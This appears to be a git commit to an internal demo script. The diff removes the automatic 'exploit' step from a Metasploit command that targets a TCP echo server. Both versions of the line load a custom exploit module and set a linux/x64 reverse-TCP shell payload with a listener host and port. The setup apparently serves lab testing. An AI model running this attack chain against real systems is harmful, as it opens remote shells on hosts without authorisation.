a881223d0c0257cfc172cfcdfbcd88b33faa9732
rsundahl <roy@polyverse.io>
2017-09-18 15:00:13 -0700

    Don't automatically exploit.

--- tcp_echo_server.sh
+++ tcp_echo_server.sh
@@ -8,4 +8,4 @@ RPORT=8080
 LHOST=$(docker run -it polyverse-internal.jfrog.io/kali-metasploit ifconfig eth0 | grep inet | awk '{print $2}')
 LPORT=5555
 
-docker run -it -p $LPORT:$LPORT -v $PWD/exploits:/usr/share/metasploit-framework/modules/exploits/custom polyverse-internal.jfrog.io/kali-metasploit msfconsole -x "use exploit/custom/tcp_echo_server.rb; set RHOST $RHOST; set RPORT $RPORT; set payload linux/x64/shell_reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit;"
+docker run -it -p $LPORT:$LPORT -v $PWD/exploits:/usr/share/metasploit-framework/modules/exploits/custom polyverse-internal.jfrog.io/kali-metasploit msfconsole -x "use exploit/custom/tcp_echo_server.rb; set RHOST $RHOST; set RPORT $RPORT; set payload linux/x64/shell_reverse_tcp; set LHOST $LHOST; set LPORT $LPORT;"
